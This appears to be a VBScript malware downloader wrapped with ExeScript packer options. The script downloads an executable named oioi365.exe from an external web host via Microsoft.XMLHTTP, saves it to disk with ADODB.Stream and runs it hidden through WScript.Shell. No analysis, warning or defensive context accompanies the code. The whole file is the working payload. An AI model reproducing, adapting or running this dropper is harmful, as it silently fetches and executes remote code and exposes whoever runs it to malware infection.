
' ----- ExeScript Options Begin -----
                            
                     
               
                                                                      
' ----- ExeScript Options End -----

Set xPost = CreateObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://d9277250.u71.c7.ixwebhosting.com/oioi365.exe",0
xPost.Send() 
Set sGet = CreateObject("ADODB.Stream") 
sGet.Mode = 3  
sGet.Type = 1  
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "oioi365.exe",2 
set ws=wscript.createobject("wscript.shell")
ws.run "oioi365.exe /start",0 